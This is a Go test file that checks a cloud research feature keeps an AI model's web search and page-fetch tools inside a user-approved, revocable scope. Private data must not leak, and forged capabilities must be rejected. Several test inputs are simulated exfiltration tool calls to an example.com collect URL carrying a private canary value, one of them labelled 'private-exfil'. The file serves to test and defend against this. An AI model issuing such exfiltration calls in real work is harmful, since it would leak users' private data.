package account

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"testing"
	"time"

	"github.com/google/uuid"
)

func newCloudResearchScopeFixture(t *testing.T, authorization *CloudRunPublicResearch) (*cloudHTTPFixture, *cloudResearchHTTPFixture, *cloudRunToolExecution) {
	t.Helper()
	f := newCloudHTTPFixture(t, func(http.ResponseWriter, *http.Request) { t.Error("scope test unexpectedly called a model") })
	peer := configureCloudResearchFixture(t, f)
	input := cloudRunTestInput(t, cloudRunTestFixture{store: f.store, runs: f.store}, 1, f.conversation.ID, uuid.NewString(), "private-current-user-canary")
	input.SessionRef = cloudSessionReference("synthetic-browser-cookie")
	input.PublicResearch = authorization
	if _, _, err := f.store.CreateCloudRun(context.Background(), input); err != nil {
		t.Fatal(err)
	}
	run, err := f.store.ClaimCloudRun(context.Background(), "scope-fixture-worker", time.Minute)
	if err != nil {
		t.Fatal(err)
	}
	runtime := &cloudRunRuntime{service: f.service, store: f.store, sessions: f.store}
	e := &cloudRunToolExecution{runtime: runtime, run: run, owner: run.LeaseOwner, store: f.store}
	t.Cleanup(e.endPublicResearch)
	return f, peer, e
}

func TestCloudPublicResearchAuthorizationSnapshot(t *testing.T) {
	if value, err := normalizeCloudPublicResearch(nil); err != nil || value != nil {
		t.Fatal("ordinary writing unexpectedly enabled networking")
	}
	input := &CloudRunPublicResearch{Topic: "  approved public topic\n"}
	value, err := normalizeCloudPublicResearch(input)
	if err != nil || value.Topic != "approved public topic" {
		t.Fatal("public topic was not normalized")
	}
	input.Topic = "changed later"
	if value.Topic != "approved public topic" {
		t.Fatal("authorization retained a mutable request alias")
	}
	for _, topic := range []string{"", " \n", strings.Repeat("a", CloudPublicResearchMaxTopicBytes+1), "a\x00b", string([]byte{0xff})} {
		if _, err := normalizeCloudPublicResearch(&CloudRunPublicResearch{Topic: topic}); err == nil {
			t.Fatal("invalid public topic accepted")
		}
	}
}

func TestCloudPublicResearchAbsentCapabilityNeverPersistsOrSendsModelArguments(t *testing.T) {
	f, peer, e := newCloudResearchScopeFixture(t, nil)
	if _, err := e.beginPublicResearch(context.Background()); err == nil {
		t.Fatal("missing user authorization minted a scope")
	}
	for _, value := range []string{"private-current-user-canary", base64.StdEncoding.EncodeToString([]byte("private-current-user-canary")), "ordinary arbitrary model output"} {
		for _, call := range []cloudModelToolCall{{ID: "query", Name: "web_search", Arguments: string(cloudJSON(map[string]any{"query": value}))}, {ID: "page", Name: "fetch_page", Arguments: string(cloudJSON(map[string]any{"url": "http://example.com/collect?report=" + url.QueryEscape(value)}))}} {
			if _, err := e.executeResearch(context.Background(), 0, call); err == nil {
				t.Fatal("private model arguments obtained network authority")
			}
		}
	}
	if peer.searches.Load() != 0 || peer.pages.Load() != 0 || f.store.cloudTools != nil {
		t.Fatal("denied model arguments reached a ledger or HTTP peer")
	}
	if _, err := f.service.searchCloudPublicResearch(context.Background(), e, "private"); err == nil {
		t.Fatal("service boundary allowed an unscoped search")
	}
	if _, err := f.service.fetchCloudPublicResearch(context.Background(), e, "http://example.com/private"); err == nil {
		t.Fatal("service boundary allowed an unscoped page fetch")
	}
	if peer.searches.Load() != 0 || peer.pages.Load() != 0 {
		t.Fatal("service guard was too late")
	}
}

func TestCloudPublicResearchScopeIsBoundToExecutionLeaseAndRevocable(t *testing.T) {
	_, peer, e := newCloudResearchScopeFixture(t, &CloudRunPublicResearch{Topic: "approved public topic"})
	ctx := context.Background()
	public, err := e.beginPublicResearch(ctx)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := e.authorizedResearchScope(public); err != nil {
		t.Fatal("genuine internal capability rejected")
	}
	type untrustedScopeKey string
	for _, fake := range []context.Context{ctx, context.WithValue(ctx, untrustedScopeKey("research_scope"), e.researchScope), context.WithValue(ctx, cloudResearchScopeContextKey{}, &cloudRunResearchScope{execution: e, userID: e.run.UserID, runID: e.run.ID, owner: e.owner, attempt: e.run.Attempt, topic: e.run.PublicResearch.Topic})} {
		if _, err := e.authorizedResearchScope(fake); err == nil {
			t.Fatal("forged/serialized capability accepted")
		}
	}
	other := *e
	if _, err := other.authorizedResearchScope(public); err == nil {
		t.Fatal("another execution borrowed the capability")
	}
	e.run.Attempt++
	if _, err := e.authorizedResearchScope(public); err == nil {
		t.Fatal("stale lease attempt retained network authority")
	}
	e.run.Attempt--
	privateSchemas := string(cloudJSON(e.researchSchemas()))
	publicSchemas := string(cloudJSON(e.publicResearchSchemas(public)))
	if strings.Contains(privateSchemas, "web_search") || strings.Contains(privateSchemas, "fetch_page") || !strings.Contains(privateSchemas, "read_source") {
		t.Fatal("private synthesis exposed outbound tools")
	}
	for _, tool := range []string{"web_search", "fetch_page", "read_source"} {
		if !strings.Contains(publicSchemas, tool) {
			t.Fatal("public research lost an authorized tool")
		}
	}
	for _, tool := range []string{"read_history", "read_file", "load_uploaded_file", "execute_code"} {
		if strings.Contains(publicSchemas, tool) {
			t.Fatal("public model obtained a private-data tool")
		}
	}
	e.endPublicResearch()
	if public.Err() == nil || ctx.Err() != nil || len(e.publicResearchSchemas(public)) != 0 {
		t.Fatal("closing public research did not revoke only the phase")
	}
	if _, err := e.beginPublicResearch(ctx); err == nil {
		t.Fatal("private synthesis reopened an old scope")
	}
	if _, err := e.runtime.service.searchCloudPublicResearch(public, e, "new topic"); err == nil {
		t.Fatal("revoked context still made a network request")
	}
	if peer.searches.Load() != 0 || peer.pages.Load() != 0 {
		t.Fatal("revoked scope reached a peer")
	}
	if strings.Contains(fmt.Sprintf("%#v", e.researchScope), "approved public topic") {
		t.Fatal("debug rendering exposed public-topic authority details")
	}
}

func TestCloudPublicResearchMessagesOwnOnlyTheirPublicTopicAndRecordedSources(t *testing.T) {
	f, peer, e := newCloudResearchScopeFixture(t, &CloudRunPublicResearch{Topic: "approved public topic"})
	ctx, err := e.beginPublicResearch(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	call := cloudModelToolCall{Index: 0, ID: "public-search", Name: "web_search", Arguments: `{"query":"approved public topic refined"}`}
	output, err := e.executeResearch(ctx, 0, call)
	if err != nil {
		t.Fatal(err)
	}
	result := map[string]any{"role": "tool", "tool_call_id": call.ID, "content": string(output)}
	if err := e.appendPublicResearchRound(ctx, &cloudModelRound{Text: "public evidence plan", ToolCalls: []cloudModelToolCall{call}, FinishReason: "tool_calls"}, []map[string]any{result}); err != nil {
		t.Fatal(err)
	}
	result["content"] = "private caller mutation"
	messages, err := e.publicResearchMessages(ctx)
	if err != nil {
		t.Fatal(err)
	}
	encoded := string(cloudJSON(messages))
	if !strings.Contains(encoded, "approved public topic") || !strings.Contains(encoded, "Search summary only") || strings.Contains(encoded, "private-current-user-canary") || strings.Contains(encoded, "private caller mutation") {
		t.Fatal("public messages included data outside their scoped provenance")
	}
	messages[1]["content"] = "another alias mutation"
	second, err := e.publicResearchMessages(ctx)
	if err != nil || strings.Contains(string(cloudJSON(second)), "another alias mutation") {
		t.Fatal("public messages retained a mutable caller alias")
	}
	if _, err := e.publicResearchPrior(context.Background()); err == nil {
		t.Fatal("private synthesis began before public authority was closed")
	}
	e.endPublicResearch()
	prior, err := e.publicResearchPrior(context.Background())
	if err != nil || len(prior) != 2 || peer.searches.Load() != 1 {
		t.Fatal("public evidence did not hand off to private synthesis")
	}
	if _, err := e.executeResearch(context.Background(), 1, cloudModelToolCall{ID: "private-exfil", Name: "fetch_page", Arguments: `{"url":"http://example.com/collect?report=private-current-user-canary"}`}); err == nil {
		t.Fatal("private synthesis reused public network authority")
	}
	if peer.pages.Load() != 0 {
		t.Fatal("private synthesis request reached public peer")
	}
	var value struct {
		Sources []struct {
			ID string `json:"source_id"`
		} `json:"sources"`
	}
	if json.Unmarshal(output, &value) != nil || len(value.Sources) != 1 {
		t.Fatal("missing persisted source")
	}
	id := value.Sources[0].ID
	if _, err := e.executeResearch(context.Background(), 2, cloudModelToolCall{ID: "local-source", Name: "read_source", Arguments: string(cloudJSON(map[string]any{"source_id": id}))}); err != nil {
		t.Fatal("private synthesis lost local access to this Run's public source")
	}
	// Seed an existing independent account-owned source to exercise Run scope,
	// without giving a public phase permission to read an older private result.
	f.store.mu.Lock()
	old := f.store.cloudResearchSources.sources[id]
	old.ID = uuid.NewString()
	old.RunID = uuid.NewString()
	f.store.cloudResearchSources.sources[old.ID] = old
	f.store.mu.Unlock()
	if _, err := e.executeResearch(context.Background(), 3, cloudModelToolCall{ID: "old-source", Name: "read_source", Arguments: string(cloudJSON(map[string]any{"source_id": old.ID}))}); err == nil {
		t.Fatal("same-account source from another Run entered current synthesis tool results")
	}
}
